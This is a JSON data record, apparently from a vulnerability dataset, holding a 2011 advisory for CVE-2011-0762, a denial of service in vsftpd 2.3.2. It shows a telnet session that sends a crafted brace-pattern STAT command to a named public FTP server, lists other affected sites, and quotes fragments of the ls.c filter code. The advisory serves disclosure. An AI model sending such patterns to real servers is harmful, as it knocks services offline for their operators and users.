{
    "text": "vul_name : vsftpd 2.3.2 remote denial-of-service ， vul_cve : CVE-2011-0762 ， vul_poc :  [ vsftpd 2.3.2 remote denial-of-service ]  ， Author : Maksymilian Arciemowicz ， Date :  ， - Dis. : 23.12.2010 ， - Pub. : 01.03.2011 ， CVE : CVE-2011-0762 ， CERT : VU # 590604 ， Fix : vsftpd 2.3.4 ( 15.02.2011 )  ， Affected Software ( verified )  :  ， - vsftpd 2.3.2 ( NetBSD 5.1 )  ， - vsftpd 2.3.0 ( Ubuntu 10.10 )  ， Affected Servers ( 19.02.2011 )  :  ， - ftp.gnu.org ( 2.0.6 )  ， - ftp.kernel.org ( 2.2.2 )  ， - ftpgen.wip4.adobe.com ( 2.3.2 )  ， - ftp.oracle.com ( 2.0.5 )  ， - ftp.freebsd.org ( 2.2.0 )  ， - more more more. ， - 0.Description - ， vsftpd is a GPL licensed FTP server for UNIX systems , including Linux. It is secure and extremely fast. It is stable. Don't take my word for it , though. Below , we will see evidence supporting all three assertions. We will also see a list of a few important sites which are happily using vsftpd. This demonstrates vsftpd is a mature and trusted solution. ， - 1. vsftpd 2.3.2 remote denial-of-service - ， As we can read in \"ls.c\" vsftpd file. ， . ，  * parsing and handling. There is broad potential for any given fnmatch ( 3 )  ，  * implementation to be buggy. ，  * Currently supported pattern ( s )  :  ，  * - any number of wildcards , \" * \" or \"?\" ，  * - { , } syntax ( not nested )  ， . ， That true but anyone who has changed ftpd bsd daemon to vsftpd to protect before CVE-2010-2632 ( glob ( 3 ) resource exhaustion ) are in danger. Any code with huge complexity , could allow of denial of service if an affected system received vulnerable pattern. This bug allow to disable wide range of servers. To designate vulnerable servers , we have to used pattern with medium complexity. ， -Example affected server- ， cx @ cx64 :  ~  $ telnet ftp.gnu.org 21 ， Trying 140.186.70.20. ， Connected to ftp.gnu.org. ， Escape character is '^ ] '. ， 220 GNU FTP server ready. ， USER anonymous ， PASS abra @ cadabra.abw ， STAT { * } , .} ， . ， 230 Login successful. ， 230 Already logged in. ， 213-Status follows :  ， -Example affected server- ， Execution time may have wide range depending on the length of pattern :  ， empty 2388 97.3 0.0 37980 1352 ? R Dec23 222 : 42 /usr/sbin/vsftpd ， 222m and counting. ， so any next { * } , Recursion} will increment the complexity. Let's see what is wrong and where. In vsftpd the main problem exists in ls.c. ， -ls.c- ， int ， vsf_filename_passes_filter ( const struct mystr * p_filename_str ,  ， const struct mystr * p_filter_str )  ， { ， . ， { ， struct str_locate_result end_brace = ， str_locate_char ( &filter_remain_str , '}' )  ;  ， must_match_at_current_pos = 1 ;  ， { ， str_split_char ( &filter_remain_str , &temp_str , '}' )  ;  ， str_copy ( &brace_list_str , &filter_remain_str )  ;  ， str_copy ( &filter_remain_str , &temp_str )  ;  ， str_split_char ( &brace_list_str , &temp_str , ' , ' )  ;  ， { ， str_copy ( &new_filter_str , &brace_list_str )  ;  ， str_append_str ( &new_filter_str , &filter_remain_str )  ;  ， { ， ret = 1 ;  ， . ， -ls.c-",
    "time": "2011-03-01 / 2012-01-11"
}